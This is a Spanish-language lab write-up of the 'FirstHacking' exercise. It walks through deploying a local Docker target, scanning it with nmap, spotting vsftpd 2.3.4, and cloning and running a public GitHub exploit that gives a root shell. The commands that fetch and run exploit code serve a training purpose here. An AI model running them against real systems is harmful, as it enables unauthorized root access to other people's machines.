# 📌 FirstHacking - Documentación de Hallazgos 🕵️‍♂️

#### [[Instalación de dependencias]]


## 🔹 **Despliegue del Laboratorio**

Para iniciar el laboratorio, ejecutamos el siguiente comando:

```bash
sudo bash auto_deploy.sh firsthacking.tar
```

Una vez desplegado, confirmamos la conectividad con un `ping`:

```bash
ping -c 1 172.17.0.2
```

📌 El parámetro `-c` indica el número de paquetes a enviar. La salida esperada:

```
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.182 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.182/0.182/0.182/0.000 ms
```

---

## 🔹 **Escaneo de Puertos con Nmap**

Realizamos un escaneo completo de todos los puertos con Nmap:

```bash
nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2 -oG allPorts
```

### 📌 **Explicación de los parámetros**

- `-p-` → Escanea todos los puertos.
- `--open` → Muestra solo los puertos abiertos.
- `--min-rate 5000` → Acelera el escaneo enviando paquetes más rápido.
- `-sS` → Escaneo silencioso SYN.
- `-vvv` → Muestra detalles en tiempo real.
- `-n` → No usa resolución DNS.
- `-Pn` → Ignora si la IP está activa o no.
- `-oG allPorts` → Guarda la salida en formato grepeable.

📌 **Resultado esperado:**

```
Host: 172.17.0.2 ()	Ports: 21/open/tcp//ftp///	Ignored State: closed (65534)
```

Se detectó **solo el puerto 21 (FTP) abierto**.

---

## 🔹 **Escaneo Específico del Puerto 21**

Dado que solo el puerto 21 está abierto, realizamos un análisis más detallado:

```bash
nmap -p21 -sCV 172.17.0.2 -oN targeted
```

### 📌 **Explicación de los parámetros**

- `-p21` → Escanea solo el puerto 21.
- `-sC` → Ejecuta scripts de reconocimiento.
- `-sV` → Detecta versiones de los servicios.
- `-oN targeted` → Guarda el resultado en formato Nmap.

📌 **Hallazgo:** Se identificó que el servicio FTP es **vsftpd 2.3.4**, una versión vulnerable.

---

## 🔹 **Explotación del Servicio [[FTP]] ([[vsftpd 2.3.4]])**

### 📌 **Búsqueda de un exploit**

Buscamos vulnerabilidades en la versión identificada:

```bash
ftp vsftpd 2.3.4 exploit github
```

Encontramos un exploit en el siguiente repositorio:

🔗 [vsftpd_2.3.4_Exploit](https://github.com/Hellsender01/vsftpd_2.3.4_Exploit)

### 📌 **Descarga y ejecución del exploit**

```bash
sudo python3 -m pip install pwntools  # Instalamos dependencias

git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit.git  # Clonamos el repositorio

cd vsftpd_2.3.4_Exploit

python3 exploit.py 172.17.0.2  # Ejecutamos el exploit
```

📌 **Resultado esperado:** Obtenemos una **shell como root** en la máquina víctima. 🎯

---

## 🔹 **Conclusiones**

✅ Se desplegó y confirmó la conectividad del laboratorio. ✅ Se realizó un escaneo de puertos con Nmap, identificando el puerto 21 abierto. ✅ Se analizó el servicio FTP y se detectó la versión vulnerable vsftpd 2.3.4. ✅ Se ejecutó un exploit que permitió obtener acceso como root.

🔴 **Recomendación**: No usar versiones antiguas y vulnerables de FTP como vsftpd 2.3.4 en entornos de producción. 🚨

---

## 🔹 **Referencias**

- [Nmap Official Documentation](https://nmap.org/book/man.html)
- [vsftpd 2.3.4 Exploit GitHub](https://github.com/Hellsender01/vsftpd_2.3.4_Exploit)
- [Exploit Database](https://www.exploit-db.com/)

📌 **Autor:** Didier José Torres Parodis